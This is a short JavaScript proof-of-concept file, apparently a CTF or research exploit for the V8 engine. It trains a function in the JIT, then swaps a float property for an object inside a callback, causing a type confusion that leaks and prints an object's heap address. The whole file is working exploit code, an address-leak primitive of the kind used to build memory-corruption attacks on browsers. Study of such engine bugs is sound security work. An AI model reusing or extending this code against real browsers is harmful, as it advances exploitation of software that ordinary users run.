/*************************************************************
 * File Name: poc.js
 * 
 * Created on: 2020-01-07 03:34:23
 * Author: raycp
 * 
 * Last Modified: 2020-01-12 02:13:13
 * Description: poc for v9
************************************************************/
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{
    f64[0] = val;
    let tmp = Array.from(u32);
    return tmp[1] * 0x100000000 + tmp[0];
}
function hex(i)
{
    return i.toString(16).padStart(16, "0");
}

var obj = {x:1.1, y:2.2};

let o = {a: 13.37, b: 14.47};

function triggerReadTypeConfuse(o, callback) {
    var tmp = o.a;
    callback();
    return o.b;
}
function evil() {
    o.b = obj
}
for(let i=0; i<100000; i++) {
    triggerReadTypeConfuse(o, ()=>1);
    triggerReadTypeConfuse(o, ()=>2);
    triggerReadTypeConfuse(o, ()=>3);
}

// %DebugPrint(o);
// %DebugPrint(obj);
// %SystemBreak();
let addr = f2i(triggerReadTypeConfuse(o, evil));

console.log("obj addr: 0x"+hex(addr));

%DebugPrint(obj);


